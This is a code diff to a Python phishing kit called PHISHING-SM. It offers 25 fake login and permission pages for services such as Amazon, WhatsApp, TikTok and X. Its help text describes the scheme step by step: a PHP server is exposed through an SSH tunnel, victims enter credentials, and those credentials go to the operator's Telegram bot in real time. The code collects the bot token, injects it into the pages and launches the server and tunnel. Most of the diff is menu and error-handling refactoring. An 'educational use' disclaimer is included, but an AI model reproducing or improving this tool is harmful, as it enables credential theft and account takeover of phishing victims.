@@ -146,6 +146,8 @@ class PhishingTool:
 """, Colors.CYAN)
         
         self.print_color(f"{Colors.BG_YELLOW}{Colors.WHITE}══════════════════════════ PAGES DESCRIPTION ═══════════════════════════{Colors.NC}")
+        
+        # Pages with descriptions in two columns
         pages_info = [
             ("1", "Amazon", "Fake Amazon login page to steal Amazon account credentials"),
             ("2", "Camera", "Camera access request page to gain camera permissions"),
@@ -171,16 +173,69 @@ class PhishingTool:
             ("22", "Tiktok", "Fake TikTok login page to steal social media credentials"),
             ("23", "Whatsapp", "Fake WhatsApp login page to steal messaging app credentials"),
             ("24", "X", "Fake X (Twitter) login page to steal social media credentials"),
-            ("25", "Yallalido", "Yalla Lido phishing page")
+            ("25", "Yallalido", "Yalla Lido phishing page"),
+            ("26", "Help", "View this help page"),
+            ("00", "Exit", "Exit the tool safely and clean up all temporary files")
         ]
         
-        for num, name, desc in pages_info:
-            self.print_color(f"[{num}] {name:12} - {desc}", Colors.GREEN)
+        # Display in two columns
+        for i in range(0, len(pages_info), 2):
+            if i + 1 < len(pages_info):
+                page1 = pages_info[i]
+                page2 = pages_info[i + 1]
+                self.print_color(f"[{page1[0]:>2}] {page1[1]:<12} - {page1[2]:<40} [{page2[0]:>2}] {page2[1]:<12} - {page2[2]}", Colors.GREEN)
+            else:
+                page1 = pages_info[i]
+                self.print_color(f"[{page1[0]:>2}] {page1[1]:<12} - {page1[2]}", Colors.GREEN)
+        
+        self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ KEY FEATURES ═══════════════════════════{Colors.NC}")
+        features = [
+            "[+] Automated PHP server setup with multiple port support",
+            "[+] SSH tunneling with localhost.run for public URL generation",
+            "[+] Real-time credentials capture and Telegram bot integration",
+            "[+] QR code generation for easy mobile device access",
+            "[+] Multiple phishing templates for various services",
+            "[+] Automatic dependency checking and installation",
+            "[+] Token management system for secure bot integration",
+            "[+] Process management and cleanup system"
+        ]
+        for feature in features:
+            self.print_color(feature, Colors.CYAN)
+        
+        self.print_color(f"\n{Colors.BG_GREEN}{Colors.WHITE}══════════════════════════ HOW IT WORKS ═══════════════════════════{Colors.NC}")
+        steps = [
+            "[1] Tool starts PHP server on localhost",
+            "[2] Creates SSH tunnel using localhost.run for public access", 
+            "[3] Generates phishing URL with target Telegram ID",
+            "[4] Victim accesses the URL and enters credentials",
+            "[5] Credentials are sent to your Telegram bot automatically",
+            "[6] You receive the stolen credentials in real-time"
+        ]
+        for step in steps:
+            self.print_color(step, Colors.WHITE)
+        
+        self.print_color(f"\n{Colors.BG_PURPLE}{Colors.WHITE}══════════════════════════ DEVELOPER INFO ═══════════════════════════{Colors.NC}")
+        dev_info = [
+            f"[+] Developer: {Colors.WHITE}Mohamed Abu Al-Saud{Colors.NC}",
+            f"[+] Telegram: {Colors.WHITE}@A_Y_TR{Colors.NC}",
+            f"[+] Channel: {Colors.WHITE}https://t.me/cybersecurityTemDF{Colors.NC}",
+            f"[+] Version: {Colors.WHITE}1.0 First Release{Colors.NC}",
+            f"[+] Tool Name: {Colors.WHITE}PHISHING-SM{Colors.NC}",
+            f"[+] Purpose: {Colors.WHITE}Educational and authorized security testing{Colors.NC}"
+        ]
+        for info in dev_info:
+            self.print_color(info, Colors.CYAN)
         
         self.print_color(f"\n{Colors.BG_RED}{Colors.WHITE}══════════════════════════ LEGAL WARNING ═══════════════════════════{Colors.NC}")
-        self.print_color("[!] This tool is for educational and authorized testing only", Colors.RED)
-        self.print_color("[!] Misuse of this tool is illegal and strictly prohibited", Colors.RED)
-        self.print_color("[!] Developer is not responsible for any misuse or damage", Colors.RED)
+        warnings = [
+            "[!] This tool is for educational and authorized testing only",
+            "[!] Misuse of this tool is illegal and strictly prohibited", 
+            "[!] Developer is not responsible for any misuse or damage",
+            "[!] Use only on systems you own or have explicit permission to test",
+            "[!] Compliance with local laws and regulations is mandatory"
+        ]
+        for warning in warnings:
+            self.print_color(warning, Colors.RED)
         
         input(f"\n{Colors.YELLOW}[!] Press any key to return to main menu...{Colors.NC}")
 
@@ -190,7 +245,6 @@ class PhishingTool:
         i = 0
         self.print_color(f"[+] {text} ", Colors.CYAN, end="")
         
-        # Simple animation - in real implementation you'd track the actual process
         for _ in range(10):
             self.print_color(spin_chars[i], Colors.YELLOW, end="")
             sys.stdout.flush()
@@ -243,7 +297,8 @@ class PhishingTool:
             'apt-get': ['apt-get', 'update', '-y'],
             'yum': ['yum', 'update', '-y'], 
             'pacman': ['pacman', '-Sy', '--noconfirm'],
-            'brew': ['brew', 'update']
+            'brew': ['brew', 'update'],
+            'apk': ['apk', 'update']
         }
         
         for manager, update_cmd in package_managers.items():
@@ -263,6 +318,8 @@ class PhishingTool:
                         install_cmd = ['pacman', '-S', '--noconfirm']
                     elif manager == 'brew':
                         install_cmd = ['brew', 'install']
+                    elif manager == 'apk':
+                        install_cmd = ['apk', 'add']
                     
                     install_cmd.extend(dependencies)
                     subprocess.run(install_cmd, check=True, capture_output=True)
@@ -352,17 +409,24 @@ class PhishingTool:
         """Display available pages menu"""
         self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ AVAILABLE PAGES ══════════════════════════{Colors.NC}")
         
-        # Create menu layout with single digits
+        # Create menu layout with two columns
         menu_items = list(self.pages.items())
-        for i in range(0, len(menu_items), 3):
-            row = menu_items[i:i+3]
-            line = f"{Colors.CYAN}│{Colors.NC}"
-            for num, page in row:
-                page_name = page.replace('.php', '').title()
-                line += f"{Colors.GREEN} [{num}] {Colors.WHITE}{page_name:15}{Colors.CYAN}│{Colors.NC}"
-            print(line)
+        for i in range(0, len(menu_items), 2):
+            if i + 1 < len(menu_items):
+                num1, page1 = menu_items[i]
+                num2, page2 = menu_items[i + 1]
+                page_name1 = page1.replace('.php', '').title()
+                page_name2 = page2.replace('.php', '').title()
+                self.print_color(f"{Colors.CYAN}│{Colors.NC} {Colors.GREEN}[{num1:>2}]{Colors.WHITE} {page_name1:<15} {Colors.CYAN}│{Colors.NC} {Colors.GREEN}[{num2:>2}]{Colors.WHITE} {page_name2:<15} {Colors.CYAN}│{Colors.NC}")
+            else:
+                num1, page1 = menu_items[i]
+                page_name1 = page1.replace('.php', '').title()
+                self.print_color(f"{Colors.CYAN}│{Colors.NC} {Colors.GREEN}[{num1:>2}]{Colors.WHITE} {page_name1:<15} {Colors.CYAN}│{Colors.NC} {' ':32} {Colors.CYAN}│{Colors.NC}")
         
-        print(f"{Colors.CYAN}└─────────────────────────────────────────────────────────────────────────────┘{Colors.NC}")
+        # Add help and exit options
+        self.print_color(f"{Colors.CYAN}│{Colors.NC} {Colors.GREEN}[26]{Colors.WHITE} Help{' ':12} {Colors.CYAN}│{Colors.NC} {Colors.GREEN}[00]{Colors.WHITE} Exit{' ':12} {Colors.CYAN}│{Colors.NC}")
+        
+        self.print_color(f"{Colors.CYAN}└─────────────────────────────────────────────────────────────────────────────┘{Colors.NC}")
         self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
 
     def stop_services(self):
@@ -700,26 +764,36 @@ class PhishingTool:
             try:
                 self.print_color(f"\n{Colors.BG_PURPLE}{Colors.WHITE}══════════════════════════ CONTROL PANEL ═══════════════════════════{Colors.NC}")
                 
+                # Compact status display
+                status_line = f"{Colors.CYAN}PHP:{Colors.WHITE} {self.php_port} "
                 if has_tmux:
-                    self.print_color(f"[+] PHP Server PID: {self.php_pid}", Colors.CYAN)
-                    self.print_color("[+] SSH Tunnel TMUX: phishing-tunnel", Colors.CYAN)
-                    self.print_color(f"[+] PHP Server: http://localhost:{self.php_port}/", Colors.CYAN)
-                    self.print_color("[!] Commands: [q]uit [t]mux [r]efresh [u]rl [s]tatus [b]ack", Colors.YELLOW)
+                    status_line += f"{Colors.CYAN}SSH:{Colors.WHITE} TMUX "
+                elif self.ssh_pid:
+                    status_line += f"{Colors.CYAN}SSH:{Colors.WHITE} {self.ssh_pid} "
+                
+                self.print_color(status_line, Colors.CYAN)
+                
+                if has_tmux:
+                    self.print_color(f"{Colors.YELLOW}Commands:{Colors.WHITE} [q]uit [t]mux [r]efresh [u]rl [s]tatus [b]ack", Colors.YELLOW)
                 else:
-                    self.print_color(f"[+] PHP Server PID: {self.php_pid}", Colors.CYAN)
-                    if self.ssh_pid:
-                        self.print_color(f"[+] SSH Tunnel PID: {self.ssh_pid}", Colors.CYAN)
-                    self.print_color(f"[+] PHP Server: http://localhost:{self.php_port}/", Colors.CYAN)
-                    self.print_color("[!] Commands: [q]uit [r]efresh [u]rl [l]ogs [s]tatus [b]ack", Colors.YELLOW)
+                    self.print_color(f"{Colors.YELLOW}Commands:{Colors.WHITE} [q]uit [r]efresh [u]rl [l]ogs [s]tatus [b]ack", Colors.YELLOW)
                 
                 self.print_color(f"{Colors.BG_PURPLE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
                 
+                # Use select for non-blocking input
                 if has_tmux:
-                    prompt = "Enter command (q/t/r/u/s/b): "
+                    prompt = f"{Colors.GREEN}[+]{Colors.NC} Command (q/t/r/u/s/b): "
                 else:
-                    prompt = "Enter command (q/r/u/l/s/b): "
+                    prompt = f"{Colors.GREEN}[+]{Colors.NC} Command (q/r/u/l/s/b): "
                 
-                user_input = input(f"{Colors.GREEN}[+]{Colors.NC} {prompt}").strip().lower()
+                # Wait for input with timeout
+                try:
+                    user_input = input(prompt).strip().lower()
+                except (KeyboardInterrupt, EOFError):
+                    self.print_color("\n[!] Stopping services...", Colors.YELLOW)
+                    self.stop_services()
+                    self.services_running = False
+                    break
                 
                 if user_input == 'q':
                     self.print_color("[!] Stopping services...", Colors.YELLOW)
@@ -740,7 +814,7 @@ class PhishingTool:
                     if Path('generated_url.txt').exists():
                         with open('generated_url.txt', 'r') as f:
                             final_url = f.read().strip()
-                        self.print_color(f"[+] Current URL: {final_url}", Colors.GREEN)
+                        self.print_color(f"[+] Current URL: {Colors.GREEN}{final_url}{Colors.NC}", Colors.WHITE)
                     else:
                         self.print_color("[-] No URL generated", Colors.RED)
                 
@@ -750,8 +824,9 @@ class PhishingTool:
                         latest_log = max(log_files, key=lambda x: x.stat().st_mtime)
                         self.print_color(f"[+] Showing SSH tunnel logs from {latest_log}:", Colors.CYAN)
                         with open(latest_log, 'r') as f:
-                            lines = f.readlines()[-20:]
-                            print(''.join(lines))
+                            lines = f.readlines()[-10:]  # Show only last 10 lines
+                            for line in lines:
+                                print(line, end='')
                     else:
                         self.print_color("[-] No SSH tunnel log file found", Colors.RED)
                 
@@ -763,6 +838,9 @@ class PhishingTool:
                     self.stop_services()
                     self.services_running = False
                     break
+                
+                else:
+                    self.print_color("[-] Invalid command", Colors.RED)
                 
                 # Check if services are still running
                 if not self.is_process_running(self.php_pid):
@@ -780,10 +858,8 @@ class PhishingTool:
                     self.services_running = False
                     break
                     
-            except (KeyboardInterrupt, EOFError):
-                self.print_color("\n[!] Stopping services...", Colors.YELLOW)
-                self.stop_services()
-                self.services_running = False
+            except Exception as e:
+                self.print_color(f"[-] Error in control panel: {str(e)}", Colors.RED)
                 break
 
     def refresh_status(self):
@@ -827,7 +903,7 @@ class PhishingTool:
 
     def cleanup(self):
         """Clean up resources and stop services"""
-        self.print_color("\n[!] Stopping all services and cleaning up...", Colors.RED)
+        self.print_color("\n[!] Stopping all services and cleaning up...", Colors.YELLOW)
         self.stop_services()
         
         if self.current_token:
@@ -837,7 +913,10 @@ class PhishingTool:
         temp_files = ['current_tunnel.url', 'generated_url.txt', 'php_server.log', 'php_server.pid', 'ssh_tunnel.pid']
         for temp_file in temp_files:
             if Path(temp_file).exists():
-                Path(temp_file).unlink()
+                try:
+                    Path(temp_file).unlink()
+                except:
+                    pass
         
         # Remove SSH tunnel logs
         for log_file in Path('.').glob('ssh_tunnel_*.log'):
@@ -850,114 +929,116 @@ class PhishingTool:
 
     def main(self):
         """Main program loop"""
-        self.print_banner()
-        
-        # Check if we're in the right directory with PHP files
-        php_files = list(Path('.').glob('*.php'))
-        if not php_files:
-            self.print_color("[-] No PHP files found in current directory!", Colors.RED)
-            self.print_color("[!] Please make sure you're in the correct directory", Colors.YELLOW)
-            self.print_color("[!] The tool requires PHP phishing pages in the current directory", Colors.YELLOW)
-            sys.exit(1)
-        
-        # Check dependencies
-        if not self.check_dependencies():
-            self.print_color("[-] Failed to install required dependencies. Exiting.", Colors.RED)
-            sys.exit(1)
-        
-        # Check for SSH key
-        if not Path('id_rsa').exists():
-            self.print_color("[!] SSH key (id_rsa) not found in current directory", Colors.YELLOW)
-            self.print_color("[!] The script will use alternative authentication methods", Colors.YELLOW)
-        
-        # Main interaction loop
-        while True:
-            self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ BOT TOKEN SETUP ═════════════════════════{Colors.NC}")
+        try:
+            self.print_banner()
             
-            # Get bot token
+            # Check if we're in the right directory with PHP files
+            php_files = list(Path('.').glob('*.php'))
+            if not php_files:
+                self.print_color("[-] No PHP files found in current directory!", Colors.RED)
+                self.print_color("[!] Please make sure you're in the correct directory", Colors.YELLOW)
+                self.print_color("[!] The tool requires PHP phishing pages in the current directory", Colors.YELLOW)
+                return
+            
+            # Check dependencies
+            if not self.check_dependencies():
+                self.print_color("[-] Failed to install required dependencies. Exiting.", Colors.RED)
+                return
+            
+            # Check for SSH key
+            if not Path('id_rsa').exists():
+                self.print_color("[!] SSH key (id_rsa) not found in current directory", Colors.YELLOW)
+                self.print_color("[!] The script will use alternative authentication methods", Colors.YELLOW)
+            
+            # Main interaction loop
             while True:
-                bot_token = input(f"{Colors.YELLOW}[+] Enter Token BoT Telegram: {Colors.NC}").strip()
-                if self.validate_token(bot_token):
-                    self.print_color("[✓] Valid bot token format!", Colors.GREEN)
-                    self.current_token = bot_token
-                    break
-                else:
-                    self.print_color("[-] Invalid bot token format!", Colors.RED)
-                    self.print_color(f"[!] Format: 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789", Colors.YELLOW)
-                    self.print_color(f"[!] Your token: {bot_token}", Colors.YELLOW)
-                    self.print_color(f"[!] Length: {len(bot_token)} characters", Colors.YELLOW)
-            
-            # Get Telegram ID
-            self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}════════════════════════ TELEGRAM ID SETUP ════════════════════════{Colors.NC}")
-            while True:
-                user_id = input(f"{Colors.YELLOW}[+] Enter ID Your Telegram account: {Colors.NC}").strip()
-                if self.validate_id(user_id):
-                    self.print_color("[✓] Valid Telegram ID!", Colors.GREEN)
-                    self.user_id = user_id
-                    break
-                else:
-                    self.print_color("[-] Invalid Telegram ID! Must be numeric and at least 5 digits", Colors.RED)
-            
-            # Replace token in PHP files
-            self.search_and_replace_token(bot_token)
-            
-            # Page selection
-            self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ PAGE SELECTION ══════════════════════════{Colors.NC}")
-            self.show_pages_menu()
-            
-            while True:
-                choice = input(f"{Colors.YELLOW}[+] Choose the page you want to create [0-26]: {Colors.NC}").strip()
+                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ BOT TOKEN SETUP ═════════════════════════{Colors.NC}")
                 
-                if choice == '0':
-                    self.show_help()
-                    self.print_banner()
-                    self.show_pages_menu()
+                # Get bot token
+                while True:
+                    bot_token = input(f"{Colors.YELLOW}[+] Enter Token BoT Telegram: {Colors.NC}").strip()
+                    if self.validate_token(bot_token):
+                        self.print_color("[✓] Valid bot token format!", Colors.GREEN)
+                        self.current_token = bot_token
+                        break
+                    else:
+                        self.print_color("[-] Invalid bot token format!", Colors.RED)
+                        self.print_color(f"[!] Format: 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789", Colors.YELLOW)
+                        self.print_color(f"[!] Your token: {bot_token}", Colors.YELLOW)
+                        self.print_color(f"[!] Length: {len(bot_token)} characters", Colors.YELLOW)
+                
+                # Get Telegram ID
+                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}════════════════════════ TELEGRAM ID SETUP ════════════════════════{Colors.NC}")
+                while True:
+                    user_id = input(f"{Colors.YELLOW}[+] Enter ID Your Telegram account: {Colors.NC}").strip()
+                    if self.validate_id(user_id):
+                        self.print_color("[✓] Valid Telegram ID!", Colors.GREEN)
+                        self.user_id = user_id
+                        break
+                    else:
+                        self.print_color("[-] Invalid Telegram ID! Must be numeric and at least 5 digits", Colors.RED)
+                
+                # Replace token in PHP files
+                self.search_and_replace_token(bot_token)
+                
+                # Page selection
+                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ PAGE SELECTION ══════════════════════════{Colors.NC}")
+                self.show_pages_menu()
+                
+                while True:
+                    choice = input(f"{Colors.YELLOW}[+] Choose the page you want to create [1-25] or 26 for help, 00 to exit: {Colors.NC}").strip()
+                    
+                    if choice == '00':
+                        self.print_color("[!] Exiting...", Colors.RED)
+                        self.cleanup()
+                        return
+                    elif choice == '26':
+                        self.show_help()
+                        self.print_banner()
+                        self.show_pages_menu()
+                        continue
+                    elif choice in self.pages:
+                        self.selected_page = self.pages[choice]
+                        break
+                    else:
+                        self.print_color("[-] Invalid selection! Choose [1-25], 26 for help, or 00 to exit", Colors.RED)
+                
+                # Check if page exists
+                if not Path(self.selected_page).exists():
+                    self.print_color(f"[-] Page '{self.selected_page}' not found!", Colors.RED)
+                    self.print_color("[!] Available PHP files in current directory:", Colors.YELLOW)
+                    for php_file in php_files:
+                        self.print_color(f"    - {php_file}", Colors.WHITE)
                     continue
-                elif choice == '26':
-                    self.print_color("[!] Exiting...", Colors.RED)
-                    self.cleanup()
-                    sys.exit(0)
-                elif choice in self.pages:
-                    self.selected_page = self.pages[choice]
-                    break
+                
+                self.print_color(f"[+] Selected page: {self.selected_page}", Colors.GREEN)
+                
+                # Stop any existing services
+                self.stop_services()
+                
+                # Start PHP server
+                if not self.start_php_server():
+                    continue
+                
+                # Start SSH tunnel
+                if self.start_ssh_tunnel():
+                    if self.generate_url():
+                        self.display_results()
+                        self.wait_for_services()
                 else:
-                    self.print_color("[-] Invalid selection! Choose [0-26]", Colors.RED)
-            
-            # Check if page exists
-            if not Path(self.selected_page).exists():
-                self.print_color(f"[-] Page '{self.selected_page}' not found!", Colors.RED)
-                self.print_color("[!] Available PHP files in current directory:", Colors.YELLOW)
-                for php_file in php_files:
-                    self.print_color(f"    - {php_file}", Colors.WHITE)
-                continue
-            
-            self.print_color(f"[+] Selected page: {self.selected_page}", Colors.GREEN)
-            
-            # Stop any existing services
-            self.stop_services()
-            
-            # Start PHP server
-            if not self.start_php_server():
-                continue
-            
-            # Start SSH tunnel
-            if self.start_ssh_tunnel():
-                if self.generate_url():
-                    self.display_results()
-                    self.wait_for_services()
-            else:
-                self.print_color("[-] Failed to start tunnel", Colors.RED)
+                    self.print_color("[-] Failed to start tunnel", Colors.RED)
+                    
+        except KeyboardInterrupt:
+            self.print_color("\n[!] Interrupted by user", Colors.YELLOW)
+            self.cleanup()
+        except Exception as e:
+            self.print_color(f"[-] Unexpected error: {str(e)}", Colors.RED)
+            self.cleanup()
 
 def main():
     """Main entry point"""
     tool = PhishingTool()
-    try:
-        tool.main()
-    except KeyboardInterrupt:
-        tool.cleanup()
-    except Exception as e:
-        print(f"{Colors.RED}[-] Unexpected error: {str(e)}{Colors.NC}")
-        tool.cleanup()
+    tool.main()
 
 if __name__ == "__main__":
     main()
